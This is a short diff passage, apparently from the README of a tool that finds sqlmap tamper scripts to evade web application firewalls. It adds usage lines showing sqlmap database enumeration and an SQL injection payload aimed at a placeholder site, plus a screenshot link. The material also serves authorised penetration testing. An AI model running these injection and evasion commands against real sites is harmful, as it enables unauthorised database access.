@@ -36,3 +36,10 @@ $ python sqlmap.py -u 'http://site.com/index.php?id=Price_ASC' --dbs --random-ag
 ```
 $ python atlas.py --url 'http://site.com/index.php?id=Price_ASC' --payload="') AND 8716=4837 AND ('yajr'='yajr" --random-agent -v
 ```
+![atlas_succ](https://i.imgur.com/U6qEnXp.png)
+
+At this point:
+
+```
+$ python sqlmap.py -u 'http://site.com/index.php?id=Price_ASC' --dbs --random-agent -v 3 --tamper=versionedkeywords,...
+```
